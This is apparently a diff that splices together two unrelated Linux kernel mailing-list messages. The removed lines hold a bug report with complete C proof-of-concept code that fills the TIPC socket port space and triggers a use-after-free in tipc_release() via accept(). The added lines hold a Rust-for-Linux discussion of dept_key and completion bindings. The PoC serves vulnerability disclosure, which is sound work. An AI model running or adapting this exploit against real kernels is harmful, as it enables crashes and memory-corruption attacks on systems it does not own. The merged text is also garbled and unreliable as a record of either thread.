-in the header comment. Built with a reduced TIPC_MAX_PORT it hits the KASAN
-slab-use-after-free in tipc_release() within a few hundred sockets; on a stock
-kernel the same path is reached at the rhashtable max (~2M sockets in the netns).
+Thank you for the input.
 
-// PoC: tipc_sk_create() dangling-sk use-after-free write on the accept() path.
-//
-// Build:  gcc -O2 -o poc poc-tipc.c
-// Run:    as root, inside a netns with TIPC available; kernel built CONFIG_TIPC=y
-//         + CONFIG_KASAN=y to observe the UAF.
-//
-// The tipc_sk_insert() failure is reached when the per-netns socket rhashtable
-// hits its max_size (~2M sockets). To make that precondition cheap to trigger,
-// build the kernel with a reduced TIPC_MAX_PORT (e.g. 0xff): the UAF code path
-// (tipc_sk_create error / tipc_accept / tipc_release) is UNMODIFIED, only the
-// search space is bounded. On a stock kernel the bug is identical, only the
-// precondition is more expensive (~2M sockets in the netns).
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <stdint.h>
-#include <sys/socket.h>
+> In general it is easy to create Rust bindings for static inline C functions
+> because it'll be just some computation, while creating bindings for C
+> function-like macros that define additional statics can be challenging.
+> 
+> Is dept_key similar to lock_class_key, where only the address matters? If so,
+> the approach that I use in
+> https://lore.kernel.org/rust-for-linux/DJP0CDOR98N5.29BK8PUFRWRUK@garyguo.net
 
-#define LOG(...) do{printf("[poc] " __VA_ARGS__);printf("\n");fflush(stdout);}while(0)
-#ifndef AF_TIPC
-#define AF_TIPC 30
-#endif
-#define TIPC_SERVICE_ADDR 2
-#define TIPC_NODE_SCOPE   3
-#define TIPC_CLUSTER_SCOPE 2
+Yes, dept_key is similar to lock_class_key.  IIUC, the way you tried for
+lock_class_key can be applied to DEPT too.  I will do:
 
-struct tipc_service_addr { uint32_t type; uint32_t instance; };
-struct tipc_socket_addr  { uint32_t ref;  uint32_t node; };
-struct tipc_service_range{ uint32_t type; uint32_t lower; uint32_t upper; };
-struct sockaddr_tipc {
-    unsigned short family;
-    unsigned char  addrtype;
-    signed   char  scope;
-    union {
-        struct tipc_socket_addr id;
-        struct tipc_service_range nameseq;
-        struct { struct tipc_service_addr name; uint32_t domain; } name;
-    } addr;
-};
+   1) add 'key' parameter to sdt_might_sleep_start_timeout()
+   2) introduce init_completion_dkey() to allow custom keys
+   3) remove init_completion_dmap() and adjust the existing users
 
-#define SVC_TYPE 0x1000u
-#define SVC_INST 1u
+Just in case, it's worth noting that the custom keys must be
+well-managed using e.g. dept_key_destroy() when the key gets freed.
 
-static void mk_svc(struct sockaddr_tipc *a, signed char scope){
-    memset(a,0,sizeof(*a));
-    a->family=AF_TIPC; a->addrtype=TIPC_SERVICE_ADDR; a->scope=scope;
-    a->addr.name.name.type=SVC_TYPE; a->addr.name.name.instance=SVC_INST; a->addr.name.domain=0;
-}
+	Byungchul
 
-int main(void){
-    LOG("BEGIN tipc_sk_create dangling-sk UAF (accept path; insert-failure precondition)");
-    int lst=socket(AF_TIPC,SOCK_STREAM,0);
-    if(lst<0){LOG("SETUP_FAIL socket(AF_TIPC) errno=%d (CONFIG_TIPC?)",errno);return 0;}
-    struct sockaddr_tipc sa; mk_svc(&sa,TIPC_NODE_SCOPE);
-    if(bind(lst,(struct sockaddr*)&sa,sizeof(sa))<0){LOG("SETUP_FAIL bind errno=%d",errno);return 0;}
-    if(listen(lst,64)<0){LOG("SETUP_FAIL listen errno=%d",errno);return 0;}
-    LOG("listener bound+listening");
-
-    int cli=socket(AF_TIPC,SOCK_STREAM,0);
-    if(cli<0){LOG("SETUP_FAIL client socket errno=%d",errno);return 0;}
-    fcntl(cli,F_SETFL,fcntl(cli,F_GETFL,0)|O_NONBLOCK);
-    struct sockaddr_tipc ca; mk_svc(&ca,TIPC_CLUSTER_SCOPE);
-    int rc=connect(cli,(struct sockaddr*)&ca,sizeof(ca));
-    LOG("client connect rc=%d errno=%d (EINPROGRESS ok)", rc, errno);
-    usleep(200000); /* let the intra-node connect reach the accept queue */
-
-    /* make tipc_sk_insert() fail: on a reduced-TIPC_MAX_PORT build this exhausts
-       the port space in a few hundred sockets; on stock this is the ~2M path */
-    static int fd[1<<21]; int nf=0, lasterr=0;
-    for(int i=0;i<(1<<21);i++){
-        int s=socket(AF_TIPC,SOCK_STREAM,0);
-        if(s<0){ lasterr=errno; break; }
-        fd[nf++]=s;
-    }
-    LOG("port-fill: created %d sockets, then socket() failed errno=%d", nf, lasterr);
-
-    struct sockaddr_tipc na; socklen_t nl=sizeof(na);
-    LOG("FIRE accept() (expect tipc_sk_create->tipc_sk_insert fail -> tipc_release UAF)");
-    int ns=accept(lst,(struct sockaddr*)&na,&nl);
-    LOG("accept rc=%d errno=%d (EINVAL = tipc_sk_create failed; UAF in __sock_release path)", ns, errno);
-    if(ns>=0) close(ns);
-    for(int k=0;k<8;k++){ int n2=accept(lst,(struct sockaddr*)&na,&nl); if(n2>=0)close(n2); }
-    LOG("POC_DONE");
-    return 0;
-}
-
-Thanks,
-Daehyeon
+> could be used for dept_key as well, then we can keep Rust `wait_for_completion`
+> still a function; otherwise we have to turn it into a macro too on the Rust side
+> to create such statics, which isn't ideal.
+> 
+> Best,
+> Gary
+> 
+> >
+> > Signed-off-by: Byungchul Park <byungchul@sk.com>
+> > ---
+> >  include/linux/completion.h | 100 +++++++++++++++++++++++++++++++------
+> >  kernel/sched/completion.c  |  60 +++++++++++-----------
+> >  rust/helpers/completion.c  |   5 ++
+> >  3 files changed, 120 insertions(+), 45 deletions(-)
 
